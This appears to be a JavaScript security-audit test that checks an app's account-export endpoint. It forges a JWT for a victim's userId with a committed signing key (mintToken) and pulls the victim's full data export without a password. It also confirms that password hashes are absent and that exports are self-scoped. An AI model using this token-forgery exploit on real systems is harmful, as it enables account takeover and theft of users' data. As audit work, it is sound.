// §6/§8 — Full-data export requires NO password re-auth: a bare valid (or FORGED)
// JWT exfiltrates the WHOLE dataset. Combined with the committed signing key
// (mintToken), an attacker who knows only a victim's userId downloads all their data.
//
// AccountController.cs:34-50  [HttpGet("export")] — no PasswordConfirmRequest, no re-auth.
// Also verifies: password hash is NOT in the export (§8 ✅), export is scoped to self.
import { provision, mintToken, api } from '../_lib/provision.mjs'
import { db } from './_db.mjs'

// Victim account — its email/nickname is always present in the export payload and
// serves as the exfil marker (no dependency on optional module endpoints).
const victim = await provision({ email: 'adv.t13.exp.victim@gmail.com', gender: 'female' })

// --- A) export with the victim's OWN valid token, NO password supplied ---
const own = await api('GET', '/api/account/export', { token: victim.token })
const hasData = own.status === 200 && /exportedAt/.test(own.text)
const hashLeaked = /passwordHash|PasswordHash/i.test(own.text)
console.log(`A) GET /export own token, no password: status=${own.status} gotData=${hasData} bytes=${own.text.length}`)
console.log(`   password hash present in export: ${hashLeaked ? 'YES (LEAK)' : 'no'}`)

// --- B) export with a FORGED token for the victim's id (attacker never logged in,
//        never knew the password). Marker = victim's own email inside the payload. ---
const forged = mintToken(victim.userId, 'attacker@gmail.com')
const stolen = await api('GET', '/api/account/export', { token: forged })
const exfil = stolen.status === 200 && stolen.text.includes(victim.email)
console.log(`B) GET /export FORGED token for victim userId=${victim.userId}: status=${stolen.status} contains-victim-email=${exfil} bytes=${stolen.text.length}`)

// --- C) export is self-scoped: attacker's own token returns ITS OWN email, not victim's ---
const attacker = await provision({ email: 'adv.t13.exp.attacker@gmail.com' })
const mine = await api('GET', '/api/account/export', { token: attacker.token })
const crossLeak = mine.text.includes(victim.email)
console.log(`C) attacker own-token export contains victim's email: ${crossLeak ? 'YES (CROSS-LEAK)' : 'no (self-scoped)'}`)

console.log('\n==== RESULT ====')
console.log(`Export without re-auth (valid token only) (§6 🟡): ${hasData ? 'CONFIRMED — no password required' : 'REFUTED'}`)
console.log(`Export via forged token = full data exfil (§8): ${exfil ? 'CONFIRMED (BROKEN — committed key + no re-auth)' : 'REFUTED'}`)
console.log(`Password hash NOT in export (§8 ✅): ${hashLeaked ? 'VIOLATED (hash leaked!)' : 'CONFIRMED safe'}`)
console.log(`Export self-scoped (no cross-user leak) (§7 ✅): ${crossLeak ? 'VIOLATED' : 'CONFIRMED'}`)
